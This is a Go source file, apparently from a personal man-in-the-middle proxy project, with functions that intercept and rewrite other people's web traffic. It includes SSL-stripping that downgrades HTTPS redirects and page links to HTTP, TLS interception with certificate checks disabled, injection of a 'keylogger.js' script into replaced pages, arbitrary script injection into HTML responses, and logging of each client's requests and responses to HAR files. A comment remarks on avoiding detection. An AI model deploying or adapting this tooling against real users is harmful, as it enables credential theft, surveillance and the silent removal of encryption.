package controllers

import (
	// "github.com/elazarl/goproxy"
	"github.com/abourget/goproxy"
	"github.com/abourget/goproxy/ext/image"
	"image"
	"image/jpeg"
	"log"
	"net"
	"net/http"
	"strings"
	"bytes"
	"os"
	"io"
	"io/ioutil"
    "crypto/tls"
    "encoding/json"
    "time"
)

const (
    CONN_HOST = "localhost"
    CONN_PORT = "8080"
    CONN_TYPE = "tcp"
    SOURCE = "/Users/alex/go/src/mitm/public"
)
// var listOfUsers map[string]struct{}
var listener net.Listener
// var proxy *goproxy.ProxyHttpServer

var banned  []string
var replace []string

func initializeBlockReplaceLists(){
	file, err := ioutil.ReadFile(SOURCE+"/blocked.json")
    if err != nil {
        log.Fatal(err)
    }
    err = json.Unmarshal(file, &banned)
    if err != nil {
        log.Fatal(err)
    }
    log.Println("Banning: ", banned)
    file, err = ioutil.ReadFile(SOURCE+"/redirect.json")
    if err != nil {
        log.Fatal(err)
    }
    err = json.Unmarshal(file, &replace)
    if err != nil {
        log.Fatal(err)
    }
	log.Println("Redirecting: ", replace)
}
 
//Gets the contents of the page that will replace the request
func getBuffer(site string) string {
	buf := bytes.NewBuffer(nil)
	var s string
	  f, err := os.Open(SOURCE+"/ReplacementPages/"+site+".html") // Error handling elided for brevity.
	  if err != nil {
	  	log.Println("read error: ", err)
	  	s = "<html><body><br><br><h1>This site is currently unavailable</h1></body></html>"
	  } else {
	  	io.Copy(buf, f)           // Error handling elided for brevity.	
		s = string(buf.Bytes())
	  }
	  
	  f.Close()
	return s
}
//replace a page with another page
func RedirectPage() net.Listener {

	log.Println("Replacing content....")
	listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
	proxy := goproxy.NewProxyHttpServer()
  	pageRedirect := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
		body := getBuffer(strings.Split(ctx.Req.URL.Host, ".")[1]) //get the middle of the url: www.url.com...
		body = injector(body, "</body>", "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/keylogger.js\"></script></body>")

    	client_response_header := make(http.Header)
    	client_response_header.Add("Content-Type", "text/html" )
    	client_response := &http.Response{
			Status: "200 OK", //resp.Status,
			StatusCode: 200, //resp.StatusCode,
		  	Proto: "HTTP/1.1", //resp.Proto,
			ProtoMajor: 1, //resp.ProtoMajor,
			ProtoMinor: 1, //resp.ProtoMinor,
			Body: ioutil.NopCloser(bytes.NewBufferString(body)),
			Header: client_response_header,
			ContentLength: int64(len(body)),
		}

	    ctx.Resp = client_response
	    ctx.DispatchResponseHandlers()
		return goproxy.DONE
	})
	proxy.HandleRequest(goproxy.RequestHostContains(replace...)(pageRedirect))
		
	go http.Serve(listener, proxy)
    return listener
}

//Block websites from list of websites between the hours of 8am and 5pm
func BlockWebsites() net.Listener {
	listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
	proxy := goproxy.NewProxyHttpServer()
  	pageBlocker := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {

        	body := "<html><body><h1>This site is blocked</h1></body></html>"
        	client_response_header := make(http.Header)
        	client_response_header.Add("Content-Type", "text/html" )
        	client_response := &http.Response{
				Status: "200 OK", //resp.Status,
				StatusCode: 200, //resp.StatusCode,
			  	Proto: "HTTP/1.1", //resp.Proto,
				ProtoMajor: 1, //resp.ProtoMajor,
				ProtoMinor: 1, //resp.ProtoMinor,
				Body: ioutil.NopCloser(bytes.NewBufferString(body)),
				Header: client_response_header,
				ContentLength: int64(len(body)),
			}
						
		    log.Println( client_response.Header )

		    ctx.Resp = client_response
		    ctx.DispatchResponseHandlers()
			return goproxy.DONE
	})
	proxy.HandleRequest(goproxy.RequestHostContains(banned...)(pageBlocker))
		
	go http.Serve(listener, proxy)
    return listener
}

//ERROR: issue is it doesnt recognise the image type
func ReplaceImages() net.Listener {
	listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
	image.RegisterFormat("jpeg", "jpeg", jpeg.Decode, jpeg.DecodeConfig)
	log.Println("Replacing images")
	decoded, _ := os.Open("public/ReplacementImages/decoded.jpg")
	defer decoded.Close()
	proxy := goproxy.NewProxyHttpServer()

	proxy.Verbose = false
	go http.Serve(listener, proxy) // you can probably ignore this error
    return listener
}

func HTTPSInterceptor() net.Listener {
	// Create the listener on the connection and start the proxy server.
	listener, _ = net.Listen(CONN_TYPE, CONN_HOST + ":" + CONN_PORT)
	proxy := goproxy.NewProxyHttpServer()
	log.Println("HTTPS Proxy setup and we are listening...")

	//how did ssl strip work? Can you redirect an HTTPS request to HTTP?
	//is that even possible? Because once HTTPS begins it expects to shake hands

	//catch HSTS (i.e it immediately puts an SNI header in place)
	proxy.HandleConnectFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
		//this should try to strip the HTTPS once, if that fails, then reject.

		//potentially best to REJECT so that MITM is not detected.
		//detection of MITM could cause suspicion
		if ctx.SNIHost() != "" {	
			log.Println("MITM-ddling: ", ctx.SNIHost())
		    return goproxy.MITM
		}
		return goproxy.FORWARD
		
	})

	proxy.HandleRequestFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {

		ctx.LogToHARFile(true)
		t := time.Now().Local()
		timestamp := t.Format("20060102150405")
		proxy.FlushHARToDisk(SOURCE+"/hars/req_"+strings.Split(ctx.Req.RemoteAddr, ":")[0]+"_"+ctx.Host()+"_"+timestamp+".har")
		
		// When doing MITM, if we've rewritten the destination host, let,s sync the
		// `Host:` header so the remote endpoints answers properly.
		if ctx.IsThroughMITM {
			ctx.Req.Host = ctx.Host()
			log.Println("is through MITM")
			return goproxy.FORWARD // don't follow through other Request Handlers
		}
		return goproxy.NEXT
	})
  	//handle 301 and 302s to HTTPS sites. Drop them to HTTPS only 
	interceptResponse := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
		log.Println("FUNC: logging to "+ctx.Host()+".har")
		ctx.LogToHARFile(true)
		t := time.Now().Local()
		timestamp := t.Format("20060102150405")
		// log.Println("timestamp: ", timestamp)
		proxy.FlushHARToDisk(SOURCE + "/hars/res_"+strings.Split(ctx.Req.RemoteAddr, ":")[0]+"_"+ctx.Host()+"_"+timestamp+".har")
		
		//if its a redirect
		if ctx.Resp != nil && (strings.Contains(ctx.Resp.Status, "301") || strings.Contains(ctx.Resp.Status, "302")) {
			//and its to an HTTPS page
			//then we kill the original request, and make the connection ourself
			if strings.Contains(ctx.Resp.Header.Get("Location"), "https") {
				ctx.Resp.Request.URL.Scheme = "http"
				ctx.Resp.Header.Set("Location", strings.Replace(ctx.Resp.Header.Get("Location"), "https", "http", -1))
				ctx.Resp.Request.URL.Host = strings.Replace(ctx.Host(), "https", "http", -1)
				log.Println("---->>> CLIENT Requested URL (redirecting): ", ctx.Resp.Request.URL)
				log.Println("<<<---- SERVER Response 301 to location: ", ctx.Resp.Header.Get("Location"))
	
				tr := &http.Transport{
		        	TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		    	}
		    	client := &http.Client{Transport: tr}
		    	server_ssl_response, err := client.Get( ctx.Resp.Header.Get("Location") )
		    	if err != nil {
		        	log.Println(" help!: ", err)
		    	}
		    	log.Println(" TLS for: ", server_ssl_response.Header.Get("Location"))
		    	
		    	log.Println(server_ssl_response.TLS)
		    	bs, err := ioutil.ReadAll(server_ssl_response.Body)
		    	if err != nil {
               		log.Println(err)
            	}
            	body := string(bs)
            	body = strings.Replace(body, "https", "http", -1)
            	client_response_header := make(http.Header)
            	client_response_header.Add("Content-Type", server_ssl_response.Header.Get("Content-Type") )
            	client_response := &http.Response{
					Status: "200 OK", //resp.Status,
					StatusCode: 200, //resp.StatusCode,
				  	Proto: "HTTP/1.1", //resp.Proto,
					ProtoMajor: 1, //resp.ProtoMajor,
					ProtoMinor: 1, //resp.ProtoMinor,
					Body: ioutil.NopCloser(bytes.NewBufferString(body)),
					Header: client_response_header,
					ContentLength: int64(len(body)),
				}							
			    ctx.Resp = client_response
			    return goproxy.FORWARD

			} else {//if ctx.Resp.Header.Get("Location")[0:5] == "http:" {
				// Redirecting to some HTTP page.
				log.Println("Response is HTTP")
		    	bs, err := ioutil.ReadAll(ctx.Resp.Body)
		    	if err != nil {
	           		log.Println(err)
	        	}
	        	body := string(bs)
	        	//strip all http out of the page so that a redirect will be required if necessary
	        	body = strings.Replace(body, "https", "http", -1)
	        	ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
		        // log.Println("BODY: ", body)
   			    // log.Println("HAR PATH: ", "/Users/alex/go/src/mitm/public/hars/"+ctx.Resp.Request.URL.String()+".har")
			   	// proxy.FlushHARToDisk("/Users/alex/go/src/mitm/public/hars/"+ctx.Resp.Request.URL.String()+".har")
			   	// ctx.LogToHARFile(true) //log the HAR files
				return goproxy.NEXT
			}

		} 
			log.Println("neither of the above, we are forwarding data")
			if strings.Contains(ctx.Resp.Request.URL.Path, "js") { //catch javascript files to embed the hook into 
					log.Println("HTTP URL: ", ctx.Resp.Request.URL.Path)
					// bs, err := ioutil.ReadAll(ctx.Resp.Body)
			  //   	if err != nil {
			  //      		log.Println(err)
			  //   	}
			  //   	body := string(bs)
			    	// body += "console.log(\"I am here!!!!!\");"
			    // 	body += "$(document).ready(function() {"+
						// "alert(\"you have been pwned motherfucker!\")"+
						// "});"
					// log.Println("JS: ", body)


			} else if strings.Contains(ctx.Resp.Request.URL.Path, "css") { //catch css and leave it alone

			} else { //must be an html file or a picture or whatever.
				bs, err := ioutil.ReadAll(ctx.Resp.Body)
		    	if err != nil {
		       		log.Println(err)
		    	}
		    	body := string(bs)
		    	body = strings.Replace(body, "https", "http", -1) //stip all https tags
		    	//need to inject javascript aswell
		    	ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
			}
			return goproxy.NEXT
	}) // end of the proxy OnResponse.
	proxy.HandleResponse((interceptResponse))

	go http.Serve(listener, proxy) // you can probably ignore this error
    return listener
}




//ERROR: want to inject code, but crashes out at the moment
func InjectScript(replace string, result string) net.Listener {
	listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
	proxy := goproxy.NewProxyHttpServer()
	log.Println("replace: ", replace)
	log.Println("result: ", result)
	//inject jquery always...
	result = "<script src=\"http://127.0.0.1:9000/public/js/jquery-1.9.1.min.js\"></script>"+result
	interceptResponse := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {

		// proxy.OnResponse().DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {

		// log.Println("URL: ", ctx.Resp.Request.URL)
		contentType := ctx.Resp.Header.Get("Content-Type")
			if !strings.Contains(contentType, "html") {
				return goproxy.NEXT	
			}
			//start reading the response for editing
			bs, err := ioutil.ReadAll(ctx.Resp.Body)
			if err != nil {
			   log.Println("inject error: ", err)
			}
			body := string(bs) //needs to be a string for reading
			body = injector(body, replace, result)

			ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
		    return goproxy.NEXT
		})
	proxy.HandleResponse(interceptResponse)
	go http.Serve(listener, proxy) // you can probably ignore this error
    return listener
}
func injector(body string, replace string, result string) string {
	body = strings.Replace(body, replace, result, -1)
	return body
}

func FlipImages() net.Listener {
	listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
	proxy := goproxy.NewProxyHttpServer()
	interceptResponse := goproxy.HandlerFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
		log.Println("URL: ", ctx.Resp.Request.URL)
		log.Println("interceptor")
		goproxy_image.HandleImage(func(img image.Image, ctx *goproxy.ProxyCtx) image.Image {
			dx, dy := img.Bounds().Dx(), img.Bounds().Dy()
			log.Println("image")
			nimg := image.NewRGBA(img.Bounds())
			for i := 0; i < dx; i++ {
				for j := 0; j <= dy; j++ {
					nimg.Set(i, j, img.At(i, dy-j-1))
				}
			}
			return nimg
		})
		return goproxy.DONE
	})
	proxy.HandleResponse(interceptResponse)
	go http.Serve(listener, proxy) // you can probably ignore this error
    return listener
}

func PassThrough() net.Listener {
	listener, _ = net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
    proxy := goproxy.NewProxyHttpServer()

    proxy.Verbose = false
		proxy.HandleRequestFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
		// log.Println("REQUEST: logging to "+ctx.Host()+".har")
		ctx.LogToHARFile(true)

		proxy.FlushHARToDisk(SOURCE+"/hars/req_"+strings.Split(ctx.Req.RemoteAddr, ":")[0]+"_"+ctx.Host()+".har")
		// addUser(ctx.Req.RemoteAddr)
		return goproxy.NEXT
	})
	proxy.HandleResponseFunc(func(ctx *goproxy.ProxyCtx) goproxy.Next {
		// log.Println("RESPONSE: logging to "+ctx.Host()+".har")
		ctx.LogToHARFile(true)
		proxy.FlushHARToDisk(SOURCE+"/hars/res_"+ctx.Host()+".har")
		return goproxy.NEXT
	})

	go http.Serve(listener, proxy) // you can probably ignore this error
    return listener
}